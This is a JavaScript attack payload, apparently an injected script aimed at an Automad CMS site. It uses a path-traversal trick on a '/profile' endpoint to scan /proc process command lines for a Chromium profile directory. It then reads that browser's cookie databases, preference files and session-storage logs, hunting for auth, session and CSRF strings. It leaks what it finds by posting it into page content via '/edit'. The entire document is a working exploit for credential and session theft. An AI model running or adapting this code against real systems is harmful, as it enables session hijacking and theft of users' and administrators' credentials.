(async()=>{
if(window.__codexRun0615af)return;
window.__codexRun0615af=1;

const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:_\\/-]/g,' '))});
const read=async p=>{
 try{
  let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
  return [r.status,await r.text()];
 }catch(e){return [0,'']}
};
const readRange=async(p,o,l=1500)=>{
 try{
  let r=await fetch('/profile'+p+'%3f?offset='+o+'&limit='+l,{cache:'no-store'});
  return [r.status,await r.text()];
 }catch(e){return [0,'']}
};

const dirsFrom=c=>{
 let out=[];
 for(let x of c.matchAll(/\/tmp\/\.?org\.chromium\.Chromium\.scoped[_\.]dir\.[A-Za-z0-9]+/g)){
  if(!out.includes(x[0]))out.push(x[0]);
 }
 return out;
};

const findDirs=async()=>{
 let dirs=[];
 for(let pid=1;pid<4000;pid++){
  let [st,c]=await read('/proc/'+pid+'/cmdline');
  if(st!==200||!c.includes('user-data-dir'))continue;
  for(let dir of dirsFrom(c)){
   if(!dirs.includes(dir)){
    dirs.push(dir);
    post('profile '+dir);
   }
  }
 }
 return dirs;
};

const preview=async p=>{
 let [st,d]=await read(p);
 post('file '+p+' '+st+' '+d.length+' '+d.slice(0,180));
 return st===200;
};

const scanFile=async p=>{
 let ok=false;
 for(let off=0;off<2500000;off+=1400){
  let [st,d]=await readRange(p,off);
  if(st!==200){post('scan miss '+p+' '+st);return false}
  if(off===0)post('scan '+p+' '+st+' '+d.length+' '+d.slice(0,120));
  if(!d.replace(/\./g,'').length)break;
  let keys=['admin-app','Automad','csrf','localhost','auth','session'];
  let hits=keys.map(x=>d.indexOf(x)).filter(x=>x>=0);
  if(hits.length){
   ok=true;
   let i=Math.max(0,Math.min(...hits)-60);
   post('hit '+p+' '+off+' '+d.slice(i,Math.min(d.length,i+360)));
  }
 }
 return ok;
};

post('profile scan 0615af');
let dirs=await findDirs();
if(!dirs.length){post('profile none');return}

for(let dir of dirs){
 await preview(dir+'/Local State');
 await preview(dir+'/Default/Preferences');
 await preview(dir+'/Default/Secure Preferences');
 let files=[
  '/Default/Network/Cookies',
  '/Default/Cookies',
  '/Network/Cookies',
  '/Cookies',
  '/Default/Session Storage/LOG',
  '/Default/Local Storage/leveldb/LOG'
 ];
 for(let f of files){
  if(await scanFile(dir+f))return;
 }
}
post('profile scan none');
})();
